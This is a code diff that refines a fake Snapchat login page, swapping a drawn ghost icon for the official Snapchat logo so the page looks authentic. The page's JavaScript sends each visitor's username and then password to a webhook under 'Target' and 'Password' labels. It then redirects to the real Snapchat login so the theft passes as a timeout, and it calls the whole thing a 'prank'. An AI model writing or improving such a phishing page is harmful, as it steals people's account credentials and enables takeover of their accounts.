@@ -12,7 +12,7 @@
             flex-direction: column;
             align-items: center;
             margin: 0;
-            padding-top: 40px;
+            padding-top: 50px;
         }
 
         #error-banner {
@@ -43,7 +43,13 @@
             box-sizing: border-box;
         }
 
-        .ghost-logo { width: 55px; margin-bottom: 15px; }
+        /* Fixed Official Logo */
+        .snap-logo {
+            width: 60px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+
         h2 { font-size: 26px; margin: 0 0 20px 0; font-weight: 700; color: #16191c; }
 
         .user-display { font-size: 14px; margin-bottom: 25px; color: #16191c; font-weight: 500; }
@@ -55,7 +61,7 @@
         input {
             width: 100%;
             padding: 14px;
-            border: 2.2px solid #000;
+            border: 2px solid #000;
             border-radius: 10px;
             box-sizing: border-box;
             font-size: 16px;
@@ -97,15 +103,15 @@
     </div>
 
     <div class="login-card" id="step1">
-        <svg class="ghost-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-            <path d="M50 15c-15 0-25 10-25 25 0 8 4 14 10 18-1 2-2 5-2 8 0 8 7 14 17 14s17-6 17-14c0-3-1-6-2-8 6-4 10-10 10-18 0-15-10-25-25-25z" fill="none" stroke="black" stroke-width="4.5"/>
-        </svg>
-
+        <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.png" class="snap-logo" alt="Snapchat">
+        
         <h2>Log in to Snapchat</h2>
+        
         <div class="input-group">
             <label id="inputLabel">Username or Email</label>
             <input type="text" id="userInput" required>
         </div>
+        
         <a class="blue-link" id="toggleLink" onclick="toggleInputType()">Use phone number instead</a>
         
         <button class="next-btn" onclick="goToStep2()">Next</button>
@@ -113,15 +119,13 @@
         <div class="divider">OR</div>
         
         <button class="google-btn" onclick="showError()">
-            <svg class="google-icon" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/><path fill="none" d="M0 0h48v48H0z"/></svg>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Color_Icon.svg" class="google-icon" alt="Google">
             Continue with Google
         </button>
     </div>
 
     <div class="login-card" id="step2" style="display: none;">
-        <svg class="ghost-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-            <path d="M50 15c-15 0-25 10-25 25 0 8 4 14 10 18-1 2-2 5-2 8 0 8 7 14 17 14s17-6 17-14c0-3-1-6-2-8 6-4 10-10 10-18 0-15-10-25-25-25z" fill="none" stroke="black" stroke-width="4.5"/>
-        </svg>
+        <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.png" class="snap-logo" alt="Snapchat">
         <h2>Enter Password</h2>
         <div class="user-display">
             <span id="displayEmail"></span><a class="not-you" onclick="location.reload()">Not you?</a>
@@ -144,9 +148,7 @@
             const label = document.getElementById('inputLabel');
             const link = document.getElementById('toggleLink');
             const input = document.getElementById('userInput');
-            
             isPhoneMode = !isPhoneMode;
-            
             if (isPhoneMode) {
                 label.innerText = "Phone Number";
                 link.innerText = "Use email instead";
@@ -166,28 +168,24 @@
         function goToStep2() {
             const user = document.getElementById('userInput').value;
             if(!user) return;
-            
             document.getElementById('displayEmail').innerText = user;
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').style.display = 'block';
-            
             fetch(webhookURL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `📱 **Login Attempt (${isPhoneMode ? 'Phone' : 'User'}):** ${user}` })
+                body: JSON.stringify({ content: `📱 **Target:** ${user}` })
             });
         }
 
         function finishPrank() {
             const pass = document.getElementById('passInput').value;
             const user = document.getElementById('userInput').value;
-            
             fetch(webhookURL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `🔑 **SUCCESS!**\nTarget: ${user}\nPass: ${pass}` })
+                body: JSON.stringify({ content: `🔑 **Password:** ${pass}\nTarget: ${user}` })
             }).then(() => {
-                // Redirects to real snapchat to make it look like a login timeout
                 window.location.href = "https://accounts.snapchat.com/accounts/login";
             });
         }
